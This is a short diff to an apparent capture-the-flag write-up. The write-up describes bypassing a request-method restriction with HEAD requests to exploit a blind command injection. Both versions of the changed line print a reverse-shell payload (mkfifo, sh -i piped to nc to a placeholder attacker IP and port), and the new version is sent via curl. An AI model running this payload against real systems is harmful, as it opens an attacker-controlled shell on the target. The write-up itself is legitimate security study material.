@@ -41,7 +41,7 @@ if the method being use is a GET result we really get that's why w now look a th
 ```
 so if we make use of another request method like HEAD, which is a request method that was allowed, we will be able to get the vulnerability. which is command injection
 
-so the payload used was  ```url/?c=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker IP> <port> >/tmp/f` ``` this payload was used beacuse it was a blind command injection
+so the payload used was  ```curl -I http://url/?c=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker IP> <port> >/tmp/f` ``` this payload was used beacuse it was a blind command injection
 .
 This we get us a reverse shell and we can get the flag
       
